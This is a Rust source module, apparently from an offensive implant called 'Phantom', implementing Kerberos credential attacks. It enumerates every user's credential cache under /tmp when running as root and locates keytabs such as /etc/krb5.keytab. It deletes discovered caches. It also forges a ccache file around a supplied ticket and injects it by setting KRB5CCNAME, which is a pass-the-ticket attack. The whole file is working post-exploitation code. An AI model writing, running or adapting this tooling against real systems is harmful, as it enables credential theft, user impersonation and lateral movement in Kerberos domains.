//! Kerberos operational functions: path discovery, ccache purge, and pass-the-ticket.

use std::fs;
use std::path::{Path, PathBuf};
use std::time::{SystemTime, UNIX_EPOCH};

use super::ccache::CCACHE_V4_TAG;
use crate::error::PhantomError;

/// Resolve the active ccache path from `$KRB5CCNAME` or the default location.
///
/// `KRB5CCNAME` can be `FILE:/path`, `file:/path`, or just `/path`.
pub(crate) fn resolve_ccache_paths() -> Vec<PathBuf> {
    let mut paths = Vec::new();

    if let Ok(env_val) = std::env::var("KRB5CCNAME") {
        let stripped = env_val
            .strip_prefix("FILE:")
            .or_else(|| env_val.strip_prefix("file:"))
            .unwrap_or(&env_val);
        let p = PathBuf::from(stripped);
        if p.exists() {
            paths.push(p);
        }
        return paths;
    }

    // Default: /tmp/krb5cc_<uid> for the current user, plus any other matches.
    let uid = unsafe { libc::getuid() };
    let default_path = PathBuf::from(format!("/tmp/krb5cc_{uid}"));
    if default_path.exists() {
        paths.push(default_path);
    }

    // Also glob /tmp/krb5cc_* to find caches for other users if running as root.
    if let Ok(entries) = fs::read_dir("/tmp") {
        for entry in entries.flatten() {
            let name = entry.file_name();
            let name_str = name.to_string_lossy();
            if name_str.starts_with("krb5cc_") {
                let p = entry.path();
                if !paths.contains(&p) {
                    paths.push(p);
                }
            }
        }
    }

    paths
}

/// Find the default keytab path.
pub(crate) fn resolve_keytab_paths() -> Vec<PathBuf> {
    let mut paths = Vec::new();

    if let Ok(env_val) = std::env::var("KRB5_KTNAME") {
        let stripped = env_val
            .strip_prefix("FILE:")
            .or_else(|| env_val.strip_prefix("file:"))
            .unwrap_or(&env_val);
        let p = PathBuf::from(stripped);
        if p.exists() {
            paths.push(p);
        }
    }

    let default_kt = Path::new("/etc/krb5.keytab");
    if default_kt.exists() && !paths.contains(&default_kt.to_path_buf()) {
        paths.push(default_kt.to_path_buf());
    }

    paths
}

/// Delete all discovered ccache files. Returns a human-readable summary.
pub(crate) fn purge_ccache_files() -> String {
    let paths = resolve_ccache_paths();
    if paths.is_empty() {
        return "No Kerberos credential caches found to purge.".to_owned();
    }

    let mut out = String::new();
    for path in &paths {
        match fs::remove_file(path) {
            Ok(()) => {
                let _ = std::fmt::Write::write_fmt(
                    &mut out,
                    format_args!("Purged: {}\n", path.display()),
                );
            }
            Err(e) => {
                let _ = std::fmt::Write::write_fmt(
                    &mut out,
                    format_args!("Failed to purge {}: {e}\n", path.display()),
                );
            }
        }
    }
    out
}

/// Build a minimal ccache v4 file containing a single credential entry.
///
/// The `ticket_data` should be the raw ASN.1 DER-encoded Kerberos ticket.
/// `principal_name` is the client principal (e.g. `user@REALM`).
pub(crate) fn build_ccache_blob(
    ticket_data: &[u8],
    principal_name: &str,
) -> Result<Vec<u8>, PhantomError> {
    let (name_part, realm) = principal_name
        .rsplit_once('@')
        .ok_or(PhantomError::TaskParse("PTT: principal must contain '@'"))?;

    let components: Vec<&str> = name_part.split('/').collect();
    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map_err(|_| PhantomError::TaskParse("PTT: system clock error"))?
        .as_secs() as u32;
    let end_time = now + 36000; // 10 hours default

    let mut buf = Vec::new();

    // Version header: 0x0504
    buf.extend_from_slice(&CCACHE_V4_TAG.to_be_bytes());
    // Header length: 0 (no tags)
    buf.extend_from_slice(&0u16.to_be_bytes());

    // Default principal
    write_principal(&mut buf, 1, realm, &components);

    // Single credential entry
    // Client principal
    write_principal(&mut buf, 1, realm, &components);
    // Server principal — use krbtgt/REALM@REALM as placeholder
    write_principal(&mut buf, 1, realm, &["krbtgt", realm]);
    // Keyblock: enctype 0, length 0
    buf.extend_from_slice(&0u16.to_be_bytes()); // enctype
    buf.extend_from_slice(&0u16.to_be_bytes()); // key length
    // Times
    buf.extend_from_slice(&now.to_be_bytes()); // auth_time
    buf.extend_from_slice(&now.to_be_bytes()); // start_time
    buf.extend_from_slice(&end_time.to_be_bytes()); // end_time
    buf.extend_from_slice(&end_time.to_be_bytes()); // renew_till
    // is_skey
    buf.push(0);
    // ticket flags (forwardable + renewable + initial + pre_authent)
    buf.extend_from_slice(&0x40a1_0000u32.to_be_bytes());
    // Addresses: 0
    buf.extend_from_slice(&0u32.to_be_bytes());
    // Auth data: 0
    buf.extend_from_slice(&0u32.to_be_bytes());
    // Ticket
    buf.extend_from_slice(&(ticket_data.len() as u32).to_be_bytes());
    buf.extend_from_slice(ticket_data);
    // Second ticket
    buf.extend_from_slice(&0u32.to_be_bytes());

    Ok(buf)
}

/// Write a ccache principal record into `buf`.
fn write_principal(buf: &mut Vec<u8>, name_type: u32, realm: &str, components: &[&str]) {
    buf.extend_from_slice(&name_type.to_be_bytes());
    buf.extend_from_slice(&(components.len() as u32).to_be_bytes());
    // Realm
    buf.extend_from_slice(&(realm.len() as u32).to_be_bytes());
    buf.extend_from_slice(realm.as_bytes());
    // Components
    for c in components {
        buf.extend_from_slice(&(c.len() as u32).to_be_bytes());
        buf.extend_from_slice(c.as_bytes());
    }
}

/// Write a ticket blob as a ccache file to disk and set `$KRB5CCNAME`.
///
/// Returns a human-readable message describing the result.
pub(crate) fn inject_ticket(ticket_data: &[u8], principal: &str) -> Result<String, PhantomError> {
    let ccache_blob = build_ccache_blob(ticket_data, principal)?;

    let uid = unsafe { libc::getuid() };
    let path = format!("/tmp/krb5cc_{uid}");

    fs::write(&path, &ccache_blob).map_err(|e| PhantomError::Io {
        path: PathBuf::from(&path),
        message: format!("failed to write ccache: {e}"),
    })?;

    // Set the environment variable so subsequent krb5 calls find it.
    // SAFETY: Phantom is single-threaded at the point kerberos commands execute;
    // no other thread is reading environment variables concurrently.
    unsafe { std::env::set_var("KRB5CCNAME", format!("FILE:{path}")) };

    Ok(format!("Ticket injected into {path} ({} bytes, principal: {principal})", ccache_blob.len()))
}
